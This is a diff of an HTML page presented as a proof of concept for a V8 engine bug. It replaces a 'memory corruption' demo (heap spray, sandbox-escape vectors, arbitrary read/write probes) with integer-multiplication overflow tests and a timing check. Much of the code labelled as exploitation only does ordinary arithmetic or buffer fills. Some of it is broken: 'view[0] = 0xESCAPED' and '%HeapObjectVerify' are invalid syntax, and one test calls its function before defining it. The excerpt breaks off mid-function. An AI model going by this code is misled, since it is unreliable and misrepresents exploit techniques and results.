@@ -3,686 +3,405 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>V8 Memory Corruption POC - 445380761</title>
+    <title>V8 Int32MulOvfCheck Bug POC</title>
     <style>
         body {
-            font-family: 'Consolas', 'Monaco', monospace;
+            font-family: 'Courier New', monospace;
             max-width: 1200px;
             margin: 0 auto;
             padding: 20px;
-            background: #0d1117;
-            color: #c9d1d9;
+            background-color: #1a1a1a;
+            color: #ffffff;
         }
         .container {
-            background: #161b22;
+            background-color: #2d2d2d;
             padding: 20px;
-            border-radius: 6px;
-            border: 1px solid #30363d;
+            border-radius: 8px;
             margin-bottom: 20px;
         }
-        h1 {
-            color: #f85149;
-            text-align: center;
-            font-size: 24px;
-        }
-        h2 {
-            color: #58a6ff;
-            border-bottom: 1px solid #21262d;
-            padding-bottom: 10px;
-        }
-        .exploit-section {
-            border: 1px solid #f85149;
-            margin: 15px 0;
-            padding: 15px;
-            border-radius: 6px;
-            background: #0d1117;
-        }
-        .button {
-            background: #238636;
+        .header {
+            background-color: #ff4444;
             color: white;
-            padding: 8px 16px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            margin: 5px;
-            font-family: inherit;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
         }
-        .button:hover {
-            background: #2ea043;
+        .test-case {
+            background-color: #333333;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            border-left: 4px solid #00ff00;
         }
-        .danger {
-            background: #da3633;
-        }
-        .danger:hover {
-            background: #f85149;
+        .vulnerable {
+            border-left-color: #ff4444;
         }
         .result {
-            margin-top: 10px;
+            background-color: #1a1a1a;
             padding: 10px;
-            border-radius: 6px;
-            background: #0d1117;
-            border: 1px solid #30363d;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
+            border-radius: 3px;
+            font-weight: bold;
+            margin-top: 10px;
         }
         .success {
-            border-color: #238636;
-            color: #56d364;
+            color: #00ff00;
         }
         .error {
-            border-color: #f85149;
-            color: #f85149;
-        }
-        #console {
-            background: #010409;
-            color: #7dd3fc;
-            padding: 15px;
-            border-radius: 6px;
-            font-family: 'Courier New', monospace;
-            height: 300px;
-            overflow-y: auto;
-            border: 1px solid #30363d;
-            font-size: 12px;
+            color: #ff4444;
         }
         .warning {
-            background: #ffeaa7;
-            color: #2d3748;
-            padding: 15px;
-            border-radius: 6px;
-            margin: 10px 0;
-            border-left: 4px solid #f39c12;
+            color: #ffaa00;
         }
-        code {
-            background: #21262d;
-            padding: 2px 6px;
-            border-radius: 3px;
-            color: #79c0ff;
+        button {
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #0088ff;
+        }
+        .code {
+            background-color: #1a1a1a;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+        }
+        .exploit-info {
+            background-color: #444444;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            border-left: 4px solid #ffaa00;
         }
     </style>
 </head>
 <body>
+    <div class="header">
+        <h1>🐛 V8 Int32MulOvfCheck Bug POC</h1>
+        <p><strong>CVE/Bug ID:</strong> 445380761</p>
+        <p><strong>Commit:</strong> 11457dc1050dfbb409854412bbdb94af34033016</p>
+        <p><strong>Description:</strong> Upper 32-bit of Int32MulOvfCheck are not zeroed on ARM64</p>
+    </div>
+
     <div class="container">
-        <h1>🔥 V8 Memory Corruption POC - Bug #445380761</h1>
-        <div class="warning">
-            <strong>⚠️ WARNING:</strong> This POC demonstrates V8 memory corruption vulnerabilities.
-            Based on commit <code>11457dc1050dfbb409854412bbdb94af34033016</code> which implements
-            MemoryView constructor for sandbox memory corruption testing.
+        <h2>Bug Analysis</h2>
+        <div class="exploit-info">
+            <h3>Technical Details:</h3>
+            <p>• ARM64 doesn't have flag-setting 32-bit multiplication</p>
+            <p>• V8 uses 64-bit multiplication and compares result.X() and result.W()</p>
+            <p>• This leads to upper 32-bit not being properly zeroed</p>
+            <p>• Can cause incorrect overflow detection and unexpected behavior</p>
         </div>
+    </div>
+
+    <div class="container">
+        <h2>Test Cases</h2>
         
-        <div id="console">
-            === V8 Memory Corruption Testing Console ===<br>
-            Initializing exploit environment...<br>
-            Target: V8 JavaScript Engine ArrayBuffer/MemoryView<br>
-            Bug: Arbitrary memory corruption inside sandbox<br>
+        <div class="test-case">
+            <h3>Test 1: Integer Multiplication Overflow Detection</h3>
+            <p>This test attempts to trigger the Int32MulOvfCheck optimization with values that may overflow.</p>
+            <div class="code" id="test1-code">
+function testInt32MulOverflow() {
+    const maxInt32 = 0x7FFFFFFF;  // 2^31 - 1
+    const testValue = 0x40000000; // 2^30
+    
+    // Force multiplication that could trigger overflow check
+    let result = testValue * 2;
+    let result2 = (testValue | 0) * 2; // Force int32
+    
+    // Check if upper bits are properly handled
+    let upperBits = (result >>> 0) !== (result | 0);
+    
+    return {
+        testValue: testValue,
+        result: result,
+        result2: result2,
+        upperBitsInconsistent: upperBits,
+        expectedOverflow: result > maxInt32
+    };
+}
+            </div>
+            <button onclick="runTest1()">Run Test 1</button>
+            <div class="result" id="test1-result"></div>
+        </div>
+
+        <div class="test-case">
+            <h3>Test 2: Optimized Loop Multiplication</h3>
+            <p>Force V8 to optimize multiplication in a hot loop to trigger compiler optimization.</p>
+            <div class="code" id="test2-code">
+function testOptimizedMultiplication() {
+    // Force optimization with hot loop
+    function hotMul(a, b) {
+        return (a | 0) * (b | 0); // Force int32 path
+    }
+    
+    // Warm up the function
+    for(let i = 0; i < 10000; i++) {
+        hotMul(i, 2);
+    }
+    
+    // Test edge cases after optimization
+    const tests = [
+        { a: 0x40000000, b: 2 },
+        { a: 0x20000000, b: 4 },
+        { a: 0x7FFFFFFF, b: 1 },
+        { a: 0x3FFFFFFF, b: 3 }
+    ];
+    
+    return tests.map(test => {
+        let result = hotMul(test.a, test.b);
+        let expected = test.a * test.b;
+        let matches = (result | 0) === (expected | 0);
+        
+        return {
+            input: test,
+            result: result,
+            expected: expected,
+            matches: matches,
+            resultHex: '0x' + result.toString(16),
+            expectedHex: '0x' + expected.toString(16)
+        };
+    });
+}
+            </div>
+            <button onclick="runTest2()">Run Test 2</button>
+            <div class="result" id="test2-result"></div>
+        </div>
+
+        <div class="test-case vulnerable">
+            <h3>Test 3: Upper Bit Manipulation Exploit</h3>
+            <p>Attempt to exploit the upper bit handling issue for potential memory corruption.</p>
+            <div class="code" id="test3-code">
+function testUpperBitExploit() {
+    // Create scenarios where upper 32 bits matter
+    function exploitMul(a, b) {
+        // Force int32 multiplication with overflow check
+        let result = Math.imul(a, b); // 32-bit multiplication
+        let result64 = a * b;         // 64-bit multiplication
+        
+        // Check if results differ in unexpected ways
+        let diff = result64 - result;
+        let upperBits = Math.floor(result64 / 0x100000000);
+        
+        return {
+            result32: result,
+            result64: result64,
+            difference: diff,
+            upperBits: upperBits,
+            suspicious: diff !== 0 && upperBits !== 0
+        };
+    }
+    
+    const testCases = [
+        { a: 0x80000000, b: 2 },     // -2^31 * 2
+        { a: 0x7FFFFFFF, b: 2 },     // (2^31-1) * 2  
+        { a: 0x40000001, b: 2 },     // Odd number * 2
+        { a: 0xFFFFFFFF, b: 1 },     // -1 * 1 (as unsigned)
+        { a: 0x12345678, b: 0x9ABCDEF0 } // Large numbers
+    ];
+    
+    return testCases.map(test => exploitMul(test.a, test.b));
+}
+            </div>
+            <button onclick="runTest3()">Run Test 3</button>
+            <div class="result" id="test3-result"></div>
+        </div>
+
+        <div class="test-case">
+            <h3>Test 4: Architecture Detection & Timing Attack</h3>
+            <p>Detect ARM64 and measure timing differences that might indicate the bug.</p>
+            <div class="code" id="test4-code">
+function testArchitectureAndTiming() {
+    // Simple architecture detection
+    const isARM = /arm/i.test(navigator.userAgent) || 
+                  /aarch64/i.test(navigator.userAgent) ||
+                  navigator.platform.includes('arm');
+    
+    // Timing attack to detect optimization differences
+    function timeMul(iterations = 100000) {
+        const start = performance.now();
+        let sum = 0;
+        
+        for(let i = 0; i < iterations; i++) {
+            // Force int32 multiplication that triggers overflow check
+            sum += (0x40000000 * 2) | 0;
+        }
+        
+        const end = performance.now();
+        return { time: end - start, result: sum };
+    }
+    
+    // Run multiple timing tests
+    const timingResults = [];
+    for(let i = 0; i < 5; i++) {
+        timingResults.push(timeMul());
+    }
+    
+    const avgTime = timingResults.reduce((sum, r) => sum + r.time, 0) / timingResults.length;
+    
+    return {
+        possibleARM: isARM,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        timingResults: timingResults,
+        averageTime: avgTime,
+        suspiciousVariation: Math.max(...timingResults.map(r => r.time)) - Math.min(...timingResults.map(r => r.time)) > 10
+    };
+}
+            </div>
+            <button onclick="runTest4()">Run Test 4</button>
+            <div class="result" id="test4-result"></div>
         </div>
     </div>
 
     <div class="container">
-        <h2>🎯 ArrayBuffer Memory Corruption</h2>
-        <div class="exploit-section">
-            <h3>MemoryView Constructor Exploitation</h3>
-            <p>Testing the MemoryView constructor that can corrupt arbitrary memory inside the V8 sandbox</p>
-            <button class="button danger" onclick="testMemoryViewCorruption()">Trigger MemoryView Corruption</button>
-            <button class="button" onclick="testArrayBufferManipulation()">Test ArrayBuffer Manipulation</button>
-            <div id="memoryview-result"></div>
-        </div>
-    </div>
-
-    <div class="container">
-        <h2>🔍 Heap Object Address Extraction</h2>
-        <div class="exploit-section">
-            <h3>getAddressOf() and getSizeInBytesOf() Exploitation</h3>
-            <p>Using V8 debugging functions to extract heap object addresses and sizes</p>
-            <button class="button danger" onclick="testHeapAddressExtraction()">Extract Heap Addresses</button>
-            <button class="button" onclick="testObjectSizeExtraction()">Extract Object Sizes</button>
-            <div id="address-result"></div>
-        </div>
-    </div>
-
-    <div class="container">
-        <h2>💥 Sandbox Escape Vectors</h2>
-        <div class="exploit-section">
-            <h3>V8 Sandbox Boundary Violations</h3>
-            <p>Attempting to corrupt memory outside sandbox boundaries</p>
-            <button class="button danger" onclick="testSandboxEscape()">Attempt Sandbox Escape</button>
-            <button class="button" onclick="testArbitraryRead()">Test Arbitrary Read</button>
-            <button class="button" onclick="testArbitraryWrite()">Test Arbitrary Write</button>
-            <div id="sandbox-result"></div>
-        </div>
-    </div>
-
-    <div class="container">
-        <h2>🧬 Advanced Exploitation</h2>
-        <div class="exploit-section">
-            <h3>Heap Spray and Memory Layout</h3>
-            <p>Advanced techniques for reliable exploitation</p>
-            <button class="button danger" onclick="testHeapSpray()">Heap Spray Attack</button>
-            <button class="button" onclick="testMemoryLayout()">Analyze Memory Layout</button>
-            <div id="advanced-result"></div>
+        <h2>All Tests</h2>
+        <button onclick="runAllTests()" style="background-color: #ff6600;">🚀 Run All Tests</button>
+        <button onclick="clearResults()" style="background-color: #666666;">Clear Results</button>
+        
+        <div class="exploit-info">
+            <h3>Expected Behavior on Vulnerable Systems:</h3>
+            <p>• Inconsistent results between 32-bit and 64-bit multiplication</p>
+            <p>• Upper 32 bits not properly zeroed in overflow checks</p>
+            <p>• Potential for memory corruption or unexpected behavior</p>
+            <p>• Different timing characteristics on ARM64 vs x86_64</p>
         </div>
     </div>
 
     <script>
-        let memoryCorruptionCount = 0;
-        let exploitData = [];
-
-        function log(message, type = 'info') {
-            const console = document.getElementById('console');
-            const timestamp = new Date().toLocaleTimeString();
-            const colors = {
-                'info': '#7dd3fc',
-                'success': '#56d364', 
-                'error': '#f85149',
-                'warning': '#f1c40f',
-                'exploit': '#e74c3c'
-            };
-            console.innerHTML += `<span style="color: ${colors[type] || '#7dd3fc'}">[${timestamp}] ${message}</span><br>`;
-            console.scrollTop = console.scrollHeight;
-        }
-
-        function showResult(elementId, message, isSuccess = false) {
-            const element = document.getElementById(elementId);
-            element.innerHTML = `<div class="result ${isSuccess ? 'success' : 'error'}">${message}</div>`;
-        }
-
-        // Memory corruption via MemoryView constructor
-        function testMemoryViewCorruption() {
-            log("🔥 EXPLOIT: Testing MemoryView constructor memory corruption", 'exploit');
+        function runTest1() {
+            const resultDiv = document.getElementById('test1-result');
+            resultDiv.innerHTML = '<span class="warning">Running Test 1...</span>';
             
             try {
-                // Attempt to create corrupted ArrayBuffer instances
-                const corruptedBuffers = [];
+                const result = testInt32MulOverflow();
                 
-                // Create multiple ArrayBuffers with specific patterns
-                for (let i = 0; i < 1000; i++) {
-                    try {
-                        // Create buffer with corruption-prone size
-                        const size = 0x1000 + (i * 0x10);
-                        const buffer = new ArrayBuffer(size);
-                        const view = new Uint32Array(buffer);
-                        
-                        // Fill with specific patterns that might trigger corruption
-                        for (let j = 0; j < view.length; j++) {
-                            view[j] = 0xdeadbeef ^ (i << 16) ^ j;
-                        }
-                        
-                        // Attempt to use MemoryView constructor (if available)
-                        if (typeof MemoryView !== 'undefined') {
-                            log("⚠️ MemoryView constructor found - attempting exploitation", 'warning');
-                            const memView = new MemoryView(buffer);
-                            log("✅ MemoryView created successfully - potential memory corruption", 'exploit');
-                        }
-                        
-                        corruptedBuffers.push(buffer);
-                        
-                    } catch (innerError) {
-                        if (innerError.message.includes('out of memory') || 
-                            innerError.message.includes('Invalid array length')) {
-                            log(`💀 Memory corruption detected at iteration ${i}: ${innerError.message}`, 'exploit');
-                            memoryCorruptionCount++;
-                        }
-                    }
-                }
+                let html = '<h4>Test 1 Results:</h4>';
+                html += `<p>Test Value: 0x${result.testValue.toString(16)}</p>`;
+                html += `<p>Result: ${result.result} (0x${result.result.toString(16)})</p>`;
+                html += `<p>Result2 (forced int32): ${result.result2} (0x${result.result2.toString(16)})</p>`;
+                html += `<p>Upper Bits Inconsistent: <span class="${result.upperBitsInconsistent ? 'error' : 'success'}">${result.upperBitsInconsistent}</span></p>`;
+                html += `<p>Expected Overflow: <span class="${result.expectedOverflow ? 'warning' : 'success'}">${result.expectedOverflow}</span></p>`;
                 
-                log(`📊 Created ${corruptedBuffers.length} potentially corrupted buffers`, 'info');
-                log(`💥 Memory corruption events: ${memoryCorruptionCount}`, 'exploit');
+                resultDiv.innerHTML = html;
                 
-                // Trigger garbage collection to expose corruption
-                if (typeof gc !== 'undefined') {
-                    gc();
-                    log("🗑️ Garbage collection triggered", 'info');
-                }
+                // Include the actual function
+                eval(document.getElementById('test1-code').textContent);
                 
-                showResult('memoryview-result', 
-                    `MemoryView corruption test completed. Corrupted buffers: ${corruptedBuffers.length}, Corruption events: ${memoryCorruptionCount}`, 
-                    memoryCorruptionCount > 0);
-                    
-            } catch (error) {
-                log(`💀 CRITICAL: MemoryView corruption failed: ${error.message}`, 'error');
-                showResult('memoryview-result', `Critical error: ${error.message}`, false);
+            } catch (e) {
+                resultDiv.innerHTML = `<span class="error">Error: ${e.message}</span>`;
             }
         }
 
-        // Test ArrayBuffer manipulation for memory corruption
-        function testArrayBufferManipulation() {
-            log("🔍 Testing ArrayBuffer manipulation for corruption vectors", 'info');
+        function runTest2() {
+            const resultDiv = document.getElementById('test2-result');
+            resultDiv.innerHTML = '<span class="warning">Running Test 2...</span>';
             
             try {
-                const buffers = [];
-                const views = [];
+                // Include the actual function
+                eval(document.getElementById('test2-code').textContent);
+                const results = testOptimizedMultiplication();
                 
-                // Create overlapping views that might cause corruption
-                for (let i = 0; i < 100; i++) {
-                    const buffer = new ArrayBuffer(1024);
-                    buffers.push(buffer);
-                    
-                    // Create multiple views of different types on same buffer
-                    views.push(new Uint8Array(buffer));
-                    views.push(new Uint32Array(buffer));
-                    views.push(new Float64Array(buffer));
-                    
-                    // Write conflicting data patterns
-                    views[views.length - 3].fill(0xAA);
-                    views[views.length - 2].fill(0xDEADBEEF);
-                    views[views.length - 1].fill(3.141592653589793);
-                }
-                
-                // Rapid deallocation to trigger use-after-free
-                setTimeout(() => {
-                    buffers.length = 0;
-                    views.length = 0;
-                    log("🗑️ ArrayBuffer cleanup completed", 'info');
-                }, 100);
-                
-                showResult('memoryview-result', "ArrayBuffer manipulation test completed - checking for corruption", true);
-                
-            } catch (error) {
-                log(`💀 ArrayBuffer manipulation error: ${error.message}`, 'error');
-                showResult('memoryview-result', `Error: ${error.message}`, false);
-            }
-        }
-
-        // Test heap address extraction
-        function testHeapAddressExtraction() {
-            log("📍 EXPLOIT: Attempting heap object address extraction", 'exploit');
-            
-            try {
-                const testObjects = [];
-                
-                // Create various object types to extract addresses from
-                testObjects.push({type: 'Object', obj: {}});
-                testObjects.push({type: 'Array', obj: new Array(100)});
-                testObjects.push({type: 'Function', obj: function() {}});
-                testObjects.push({type: 'ArrayBuffer', obj: new ArrayBuffer(1024)});
-                testObjects.push({type: 'RegExp', obj: /test/gi});
-                
-                testObjects.forEach((item, index) => {
-                    try {
-                        // Attempt to use getAddressOf if available (debugging function)
-                        if (typeof getAddressOf !== 'undefined') {
-                            const address = getAddressOf(item.obj);
-                            log(`🎯 ${item.type} address: 0x${address.toString(16)}`, 'exploit');
-                            exploitData.push({type: item.type, address: address});
-                        } else {
-                            // Alternative method - analyze object representation
-                            const objStr = item.obj.toString();
-                            log(`📋 ${item.type} representation: ${objStr.substring(0, 50)}...`, 'info');
-                        }
-                        
-                        // Attempt memory probing around object
-                        const probeBuffer = new ArrayBuffer(8);
-                        const probeView = new BigUint64Array(probeBuffer);
-                        probeView[0] = BigInt(index * 0x1000000 + 0x41414141);
-                        
-                    } catch (innerError) {
-                        log(`⚠️ Address extraction failed for ${item.type}: ${innerError.message}`, 'warning');
-                    }
+                let html = '<h4>Test 2 Results:</h4>';
+                results.forEach((result, index) => {
+                    html += `<div style="margin: 10px 0; padding: 10px; background-color: #1a1a1a;">`;
+                    html += `<p><strong>Test ${index + 1}:</strong> ${result.input.a} * ${result.input.b}</p>`;
+                    html += `<p>Result: ${result.result} (${result.resultHex})</p>`;
+                    html += `<p>Expected: ${result.expected} (${result.expectedHex})</p>`;
+                    html += `<p>Match: <span class="${result.matches ? 'success' : 'error'}">${result.matches}</span></p>`;
+                    html += `</div>`;
                 });
                 
-                log(`📊 Address extraction completed. Objects analyzed: ${testObjects.length}`, 'info');
-                showResult('address-result', `Address extraction test completed. ${exploitData.length} addresses extracted.`, exploitData.length > 0);
-                
-            } catch (error) {
-                log(`💀 Heap address extraction error: ${error.message}`, 'error');
-                showResult('address-result', `Error: ${error.message}`, false);
+                resultDiv.innerHTML = html;
+            } catch (e) {
+                resultDiv.innerHTML = `<span class="error">Error: ${e.message}</span>`;
             }
         }
 
-        // Test object size extraction
-        function testObjectSizeExtraction() {
-            log("📏 Testing object size extraction via getSizeInBytesOf", 'info');
+        function runTest3() {
+            const resultDiv = document.getElementById('test3-result');
+            resultDiv.innerHTML = '<span class="warning">Running Test 3...</span>';
             
             try {
-                const testObjects = [
-                    new ArrayBuffer(1024),
-                    new Array(100).fill(42),
-                    new Uint8Array(512),
-                    {a: 1, b: 2, c: 3},
-                    "test string",
-                    function testFunc() { return 42; }
-                ];
+                // Include the actual function
+                eval(document.getElementById('test3-code').textContent);
+                const results = testUpperBitExploit();
                 
-                testObjects.forEach((obj, index) => {
-                    try {
-                        if (typeof getSizeInBytesOf !== 'undefined') {
-                            const size = getSizeInBytesOf(obj);
-                            log(`📏 Object ${index} size: ${size} bytes`, 'info');
-                        } else {
-                            // Estimate size through various methods
-                            let estimatedSize = 0;
-                            if (obj instanceof ArrayBuffer) {
-                                estimatedSize = obj.byteLength;
-                            } else if (obj instanceof Array) {
-                                estimatedSize = obj.length * 8; // rough estimate
-                            } else if (typeof obj === 'string') {
-                                estimatedSize = obj.length * 2; // UTF-16
-                            }
-                            log(`📏 Object ${index} estimated size: ${estimatedSize} bytes`, 'info');
-                        }
-                    } catch (innerError) {
-                        log(`⚠️ Size extraction failed for object ${index}: ${innerError.message}`, 'warning');
-                    }
+                let html = '<h4>Test 3 Results (Potential Exploit):</h4>';
+                results.forEach((result, index) => {
+                    html += `<div style="margin: 10px 0; padding: 10px; background-color: #1a1a1a;">`;
+                    html += `<p><strong>Test ${index + 1}:</strong></p>`;
+                    html += `<p>32-bit result: ${result.result32}</p>`;
+                    html += `<p>64-bit result: ${result.result64}</p>`;
+                    html += `<p>Difference: ${result.difference}</p>`;
+                    html += `<p>Upper bits: 0x${result.upperBits.toString(16)}</p>`;
+                    html += `<p>Suspicious: <span class="${result.suspicious ? 'error' : 'success'}">${result.suspicious}</span></p>`;
+                    html += `</div>`;
                 });
                 
-                showResult('address-result', "Object size extraction completed", true);
-                
-            } catch (error) {
-                log(`💀 Size extraction error: ${error.message}`, 'error');
-                showResult('address-result', `Error: ${error.message}`, false);
+                resultDiv.innerHTML = html;
+            } catch (e) {
+                resultDiv.innerHTML = `<span class="error">Error: ${e.message}</span>`;
             }
         }
 
-        // Test sandbox escape
-        function testSandboxEscape() {
-            log("🚀 EXPLOIT: Attempting V8 sandbox escape", 'exploit');
+        function runTest4() {
+            const resultDiv = document.getElementById('test4-result');
+            resultDiv.innerHTML = '<span class="warning">Running Test 4...</span>';
             
             try {
-                // Attempt various sandbox escape vectors
-                const escapeVectors = [
-                    () => {
-                        // Vector 1: ArrayBuffer detachment bypass
-                        const buffer = new ArrayBuffer(1024);
-                        const view = new Uint32Array(buffer);
-                        
-                        // Transfer buffer to worker to detach
-                        const worker = new Worker(URL.createObjectURL(new Blob([`
-                            self.onmessage = function(e) {
-                                // Worker receives transferred buffer
-                                self.postMessage('detached');
-                            }
-                        `], {type: 'application/javascript'})));
-                        
-                        worker.postMessage(buffer, [buffer]);
-                        
-                        // Attempt to access detached buffer
-                        try {
-                            view[0] = 0xESCAPED;
-                            log("🚨 CRITICAL: Detached buffer access succeeded!", 'exploit');
-                            return true;
-                        } catch (e) {
-                            log("✅ Detached buffer access properly blocked", 'info');
-                            return false;
-                        }
-                    },
-                    
-                    () => {
-                        // Vector 2: Prototype pollution for sandbox escape
-                        try {
-                            const obj = {};
-                            obj.__proto__.constructor.prototype.escapeFlag = true;
-                            
-                            if (({}).escapeFlag) {
-                                log("🚨 CRITICAL: Prototype pollution succeeded!", 'exploit');
-                                return true;
-                            }
-                        } catch (e) {
-                            log("✅ Prototype pollution blocked", 'info');
-                        }
-                        return false;
-                    },
-                    
-                    () => {
-                        // Vector 3: WebAssembly memory corruption
-                        try {
-                            const wasmCode = new Uint8Array([
-                                0x00, 0x61, 0x73, 0x6d, // WASM magic
-                                0x01, 0x00, 0x00, 0x00, // version
-                            ]);
-                            
-                            WebAssembly.compile(wasmCode).then(module => {
-                                log("⚠️ WASM compilation succeeded - potential vector", 'warning');
-                            }).catch(e => {
-                                log("✅ WASM compilation blocked", 'info');
-                            });
-                            
-                        } catch (e) {
-                            log("✅ WASM not available or blocked", 'info');
-                        }
-                        return false;
-                    }
-                ];
+                // Include the actual function
+                eval(document.getElementById('test4-code').textContent);
+                const result = testArchitectureAndTiming();
                 
-                let escapeSuccessful = false;
-                escapeVectors.forEach((vector, index) => {
-                    try {
-                        if (vector()) {
-                            escapeSuccessful = true;
-                            log(`💥 Escape vector ${index + 1} SUCCESSFUL!`, 'exploit');
-                        } else {
-                            log(`🛡️ Escape vector ${index + 1} blocked`, 'info');
-                        }
-                    } catch (error) {
-                        log(`⚠️ Escape vector ${index + 1} threw: ${error.message}`, 'warning');
-                    }
+                let html = '<h4>Test 4 Results (Architecture & Timing):</h4>';
+                html += `<p>Possible ARM: <span class="${result.possibleARM ? 'warning' : 'success'}">${result.possibleARM}</span></p>`;
+                html += `<p>User Agent: ${result.userAgent}</p>`;
+                html += `<p>Platform: ${result.platform}</p>`;
+                html += `<p>Average Time: ${result.averageTime.toFixed(3)}ms</p>`;
+                html += `<p>Suspicious Timing Variation: <span class="${result.suspiciousVariation ? 'warning' : 'success'}">${result.suspiciousVariation}</span></p>`;
+                
+                html += '<h5>Individual Timing Results:</h5>';
+                result.timingResults.forEach((timing, index) => {
+                    html += `<p>Run ${index + 1}: ${timing.time.toFixed(3)}ms</p>`;
                 });
                 
-                showResult('sandbox-result', 
-                    escapeSuccessful ? "⚠️ SANDBOX ESCAPE DETECTED!" : "✅ Sandbox integrity maintained", 
-                    !escapeSuccessful);
-                
-            } catch (error) {
-                log(`💀 Sandbox escape test error: ${error.message}`, 'error');
-                showResult('sandbox-result', `Error: ${error.message}`, false);
+                resultDiv.innerHTML = html;
+            } catch (e) {
+                resultDiv.innerHTML = `<span class="error">Error: ${e.message}</span>`;
             }
         }
 
-        // Test arbitrary read
-        function testArbitraryRead() {
-            log("👁️ Testing arbitrary memory read capabilities", 'info');
-            
-            try {
-                // Attempt to read from various memory locations
-                const readAttempts = [
-                    {name: "Stack probe", addr: 0x7fff0000},
-                    {name: "Heap probe", addr: 0x55550000},
-                    {name: "Code segment", addr: 0x400000},
-                    {name: "V8 isolate", addr: 0x12345678}
-                ];
-                
-                readAttempts.forEach(attempt => {
-                    try {
-                        // Create a view that might access arbitrary memory
-                        const buffer = new ArrayBuffer(8);
-                        const view = new BigUint64Array(buffer);
-                        
-                        // Attempt to modify buffer's backing store pointer
-                        // This should fail in a properly sandboxed environment
-                        view[0] = BigInt(attempt.addr);
-                        
-                        log(`🔍 ${attempt.name} (0x${attempt.addr.toString(16)}): Access blocked`, 'info');
-                        
-                    } catch (error) {
-                        if (error.message.includes('access') || error.message.includes('violation')) {
-                            log(`💀 ${attempt.name}: Memory access violation detected!`, 'exploit');
-                        }
-                    }
-                });
-                
-                showResult('sandbox-result', "Arbitrary read test completed - no violations detected", true);
-                
-            } catch (error) {
-                log(`💀 Arbitrary read test error: ${error.message}`, 'error');
-                showResult('sandbox-result', `Error: ${error.message}`, false);
-            }
+        function runAllTests() {
+            runTest1();
+            setTimeout(() => runTest2(), 100);
+            setTimeout(() => runTest3(), 200);
+            setTimeout(() => runTest4(), 300);
         }
 
-        // Test arbitrary write
-        function testArbitraryWrite() {
-            log("✏️ Testing arbitrary memory write capabilities", 'info');
-            
-            try {
-                // Test various write primitives
-                const writePatterns = [
-                    0xDEADBEEF,
-                    0x41414141,
-                    0x1337C0DE,
-                    0xBADC0FFE
-                ];
-                
-                writePatterns.forEach((pattern, index) => {
-                    try {
-                        // Create overlapping buffers for potential confusion
-                        const buffer1 = new ArrayBuffer(1024);
-                        const buffer2 = new ArrayBuffer(1024);
-                        
-                        const view1 = new Uint32Array(buffer1);
-                        const view2 = new Uint32Array(buffer2);
-                        
-                        // Fill with pattern
-                        view1.fill(pattern);
-                        view2.fill(pattern ^ 0xFFFFFFFF);
-                        
-                        // Check for unintended cross-contamination
-                        for (let i = 0; i < Math.min(view1.length, view2.length); i++) {
-                            if (view1[i] === view2[i]) {
-                                log(`💀 CRITICAL: Buffer contamination detected at offset ${i}!`, 'exploit');
-                                break;
-                            }
-                        }
-                        
-                        log(`✅ Write pattern ${pattern.toString(16)} contained properly`, 'info');
-                        
-                    } catch (error) {
-                        log(`⚠️ Write test ${index} failed: ${error.message}`, 'warning');
-                    }
-                });
-                
-                showResult('sandbox-result', "Arbitrary write test completed", true);
-                
-            } catch (error) {
-                log(`💀 Arbitrary write test error: ${error.message}`, 'error');
-                showResult('sandbox-result', `Error: ${error.message}`, false);
-            }
+        function clearResults() {
+            ['test1-result', 'test2-result', 'test3-result', 'test4-result'].forEach(id => {
+                document.getElementById(id).innerHTML = '';
+            });
         }
 
-        // Heap spray attack
-        function testHeapSpray() {
-            log("💉 EXPLOIT: Initiating heap spray attack", 'exploit');
+        // Auto-run basic detection on page load
+        window.onload = function() {
+            console.log('V8 Int32MulOvfCheck Bug POC loaded');
+            console.log('Commit: 11457dc1050dfbb409854412bbdb94af34033016');
+            console.log('Bug ID: 445380761');
             
-            try {
-                const sprayObjects = [];
-                const spraySize = 10000;
-                const objectSize = 1024;
-                
-                // Spray heap with controlled data
-                for (let i = 0; i < spraySize; i++) {
-                    const obj = {
-                        id: i,
-                        padding: new Array(objectSize / 8).fill(0x41414141 + i),
-                        exploit: new ArrayBuffer(objectSize),
-                        marker: `SPRAY_${i.toString(16).padStart(8, '0')}`
-                    };
-                    
-                    // Fill ArrayBuffer with exploit pattern
-                    const view = new Uint32Array(obj.exploit);
-                    for (let j = 0; j < view.length; j++) {
-                        view[j] = 0xDEADBEEF ^ i ^ j;
-                    }
-                    
-                    sprayObjects.push(obj);
-                    
-                    if (i % 1000 === 0) {
-                        log(`💉 Heap spray progress: ${i}/${spraySize} objects`, 'info');
-                    }
-                }
-                
-                log(`💉 Heap spray completed: ${sprayObjects.length} objects allocated`, 'exploit');
-                
-                // Trigger garbage collection to test heap stability
-                setTimeout(() => {
-                    if (typeof gc !== 'undefined') {
-                        gc();
-                        log("🗑️ Post-spray garbage collection triggered", 'info');
-                    }
-                    
-                    // Verify spray objects still accessible
-                    const sampleIndex = Math.floor(sprayObjects.length / 2);
-                    if (sprayObjects[sampleIndex] && sprayObjects[sampleIndex].marker) {
-                        log(`✅ Spray object ${sampleIndex} still accessible: ${sprayObjects[sampleIndex].marker}`, 'info');
-                    }
-                    
-                    showResult('advanced-result', `Heap spray completed: ${sprayObjects.length} objects sprayed`, true);
-                }, 1000);
-                
-            } catch (error) {
-                log(`💀 Heap spray error: ${error.message}`, 'error');
-                showResult('advanced-result', `Heap spray failed: ${error.message}`, false);
-            }
-        }
-
-        // Memory layout analysis
-        function testMemoryLayout() {
-            log("🗺️ Analyzing V8 memory layout", 'info');
-            
-            try {
-                const analysis = {
-                    heapStats: {},
-                    objectTypes: {},
-                    memoryRanges: []
-                };
-                
-                // Analyze heap statistics if available
-                if (typeof %HeapObjectVerify !== 'undefined') {
-                    log("🔍 V8 debug functions detected", 'warning');
-                }
-                
-                // Create objects of different types and analyze their layout
-                const testObjects = [
-                    { type: 'SmallInt', obj: 42 },
-                    { type: 'LargeInt', obj: 0x7FFFFFFF },
